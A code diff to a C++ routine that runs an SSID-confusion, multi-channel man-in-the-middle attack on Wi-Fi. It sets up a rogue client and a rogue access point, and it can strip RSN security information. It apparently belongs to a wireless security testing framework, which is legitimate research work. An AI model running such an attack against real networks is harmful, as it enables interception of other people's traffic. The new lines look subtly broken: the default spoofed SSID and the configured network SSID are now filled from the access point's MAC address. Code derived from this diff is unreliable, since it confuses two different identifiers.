@@ -17,25 +17,23 @@ void run_attack(RunStatus &rs){
 	const auto client       = rs.get_actor("client");
 
 	const auto &att_cfg       = rs.config().at("attack_config");
-	const string real_ssid     = ap["ssid"];
-	const string confused_ssid = att_cfg.value("confused_ssid", real_ssid);
+	const string confused_ssid = att_cfg.value("confused_ssid", ap.get(SK::mac));
 	const bool   strip_rsn     = att_cfg.value("strip_rsn", false);
 	const int    timeout       = att_cfg.value("attack_time_sec", 30);
 
-	McMitm attack(rogue_client, rogue_ap, real_ssid,
-				  ap.get(SK::mac), client.get(SK::mac),
-				  rs.run_folder() / "logger");
+	McMitm attack(rogue_client, rogue_ap, ap,
+				client.get(SK::mac), rs.run_folder() / "logger");
 
-	attack.set_hooks(make_unique<SsidConfusionHooks>(real_ssid, confused_ssid, strip_rsn));
+	attack.set_hooks(make_unique<SsidConfusionHooks>(ap.get(SK::ssid), confused_ssid, strip_rsn));
 
-	rogue_client->set_iface_up();
 	rogue_client->up_sniff_iface();
 	rogue_ap->set_iface_up();
+	rogue_client->set_iface_up();
 	rs.start_observers();
 
 	attack.netconfig.real_channel  = rogue_client->get_channel();
 	attack.netconfig.rogue_channel = rogue_ap->get_channel();
-	attack.netconfig.ssid          = real_ssid;
+	attack.netconfig.ssid          = ap[SK::mac] ? ap.get(SK::mac) : "";
 
 	attack.run(rs, timeout);
 }
